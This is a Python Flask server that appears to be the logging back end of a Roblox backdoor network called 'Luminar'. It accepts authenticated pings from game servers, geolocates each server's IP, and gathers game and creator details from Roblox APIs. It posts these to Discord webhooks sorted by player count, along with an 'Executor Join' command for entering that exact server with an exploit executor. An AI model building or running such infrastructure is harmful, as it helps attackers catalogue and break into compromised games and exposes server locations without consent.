import os, hashlib, time, requests
from flask import Flask, request, jsonify

app = Flask(__name__)

# --- LUMINAR CONFIGURATION (From Render Env) ---
AUTH_SECRET = os.environ.get('AUTH_SECRET')
WEBHOOKS = {
    "tier1": os.environ.get('WEBHOOK_0_50'),     # 0-49 players
    "tier2": os.environ.get('WEBHOOK_50_100'),   # 50-99 players
    "tier3": os.environ.get('WEBHOOK_100_500'),  # 100-499 players
    "tier4": os.environ.get('WEBHOOK_INFINITY')  # 500+ players
}

def get_location(ip):
    try:
        res = requests.get(f"http://ip-api.com/json/{ip}").json()
        if res['status'] == 'success':
            return f"📍 {res['city']}, {res['country']} ({res['isp']})"
    except: pass
    return "Unknown Location"

def verify_luminar_security(provided_hash):
    """Checks the hash against current minute and 2 minutes prior."""
    current_min = time.gmtime().tm_min
    # We check: Current Minute, Minute-1, Minute-2
    minutes_to_check = [current_min, (current_min - 1) % 60, (current_min - 2) % 60]
    
    for m in minutes_to_check:
        expected = hashlib.sha256(f"{AUTH_SECRET}:{m}".encode()).hexdigest()
        if provided_hash == expected:
            return True
    return False

@app.route('/webhook', methods=['POST'])
def handle_webhook():
    data = request.json
    provided_hash = request.headers.get('X-Luminar-Auth')

    # 1. Security Check (SHA256 + Time Window)
    if not verify_luminar_security(provided_hash):
        return jsonify({"error": "Unauthorized Security Breach"}), 401

    try:
        place_id = data.get('placeId')
        server_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
        
        # 2. Fetch Deep Info
        u_req = requests.get(f"https://apis.roblox.com/universes/v1/places/{place_id}/universe").json()
        u_id = u_req.get('universeId')
        
        g_info = requests.get(f"https://games.roblox.com/v1/games?universeIds={u_id}").json()['data'][0]
        v_info = requests.get(f"https://games.roblox.com/v1/games/votes?universeIds={u_id}").json()['data'][0]
        icon = requests.get(f"https://thumbnails.roblox.com/v1/games/icons?universeIds={u_id}&size=256x256&format=Png&isCircular=false").json()['data'][0]['imageUrl']
        thumb = requests.get(f"https://thumbnails.roblox.com/v1/games/multiget/thumbnails?universeIds={u_id}&size=768x432&format=Png").json()['data'][0]['thumbnails'][0]['imageUrl']

        # 3. Tiered Webhook Routing
        active = g_info.get('playing', 0)
        if active >= 500: target = WEBHOOKS["tier4"]
        elif active >= 100: target = WEBHOOKS["tier3"]
        elif active >= 50: target = WEBHOOKS["tier2"]
        else: target = WEBHOOKS["tier1"]

        if not target: return jsonify({"error": "Webhook not set for this tier"}), 500

        # 4. Construct Luminar Embed
        payload = {
            "embeds": [{
                "author": {"name": "Luminar Project | Intelligence", "icon_url": icon},
                "title": f"🚀  Server Log: {g_info['name']}",
                "url": f"https://www.roblox.com/games/{place_id}",
                "color": 0x2ECC71 if active < 100 else 0xE74C3C,
                "image": {"url": thumb},
                "thumbnail": {"url": icon},
                "fields": [
                    {"name": "🌐 Server Location", "value": f"**IP:** `{server_ip}`\n{get_location(server_ip)}", "inline": False},
                    {"name": "👥 Population", "value": f"**Total Active:** {active:,}\n**Current Server:** {data['playerCount']}/{data['maxPlayers']}", "inline": True},
                    {"name": "👑 Creator", "value": f"[{g_info['creator']['name']}](https://www.roblox.com/users/{g_info['creator']['id']})", "inline": True},
                    {"name": "📊 Stats", "value": f"👍 {v_info['upVotes']:,} | ⭐ {g_info['favoritedCount']:,}", "inline": True},
                    {"name": "💻 Executor Join", "value": f"```js\nRoblox.GameLauncher.joinGameInstance({place_id}, '{data.get('jobId','')}');\n```", "inline": False}
                ],
                "footer": {"text": "Luminar Security Active • UTC Time"}
            }]
        }

        requests.post(target, json=payload)
        return jsonify({"status": "Luminar Log Dispatched"}), 200

    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 10000)))
